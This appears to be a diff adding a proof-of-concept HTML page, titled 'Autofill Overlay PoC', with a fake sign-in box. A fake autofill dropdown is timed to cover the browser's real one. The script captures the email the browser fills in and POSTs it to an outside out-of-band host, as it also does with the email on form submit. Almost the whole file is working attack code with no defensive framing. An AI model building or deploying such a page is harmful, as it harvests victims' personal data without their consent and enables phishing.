@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Autofill Overlay PoC</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f9f9f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      position: relative;
+      width: 360px;
+    }
+    input[type="email"] {
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      margin-top: 10px;
+    }
+    #overlayAutofill {
+      display: none;
+      position: absolute;
+      top: 90px;
+      left: 0;
+      width: 100%;
+      background: white;
+      border: 1px solid #ccc;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.15);
+      z-index: 9999;
+    }
+    #overlayAutofill span {
+      display: block;
+      padding: 10px;
+      cursor: pointer;
+    }
+    #overlayAutofill span:hover {
+      background-color: #f0f0f0;
+    }
+    button {
+      margin-top: 20px;
+      padding: 10px;
+      width: 100%;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login-box">
+  <h3>Sign in</h3>
+  <form id="loginForm">
+    <input id="emailInput" type="email" name="email" autocomplete="email" placeholder="Email address" required />
+    <div id="overlayAutofill">
+      <span>victim.email@example.com</span>
+      <span>other.email@domain.com</span>
+    </div>
+    <button type="submit">Next</button>
+  </form>
+</div>
+
+<script>
+  const emailInput = document.getElementById('emailInput');
+  const overlay = document.getElementById('overlayAutofill');
+
+  emailInput.addEventListener('focus', () => {
+    setTimeout(() => {
+      overlay.style.display = 'block';
+    }, 150); // delay to allow native autofill to appear
+  });
+
+  overlay.addEventListener('click', (e) => {
+    if (e.target.tagName === 'SPAN') {
+      overlay.style.display = 'none';
+      setTimeout(() => {
+        // capture the value from autofill (NOT the clicked fake one)
+        const realValue = emailInput.value;
+        if (realValue) {
+          fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: realValue })
+          });
+        }
+      }, 300); // give autofill time to populate
+    }
+  });
+
+  document.getElementById('loginForm').addEventListener('submit', (e) => {
+    e.preventDefault();
+    const email = emailInput.value.trim();
+    if (email) {
+      fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email })
+      });
+    }
+  });
+</script>
+
+</body>
+</html>
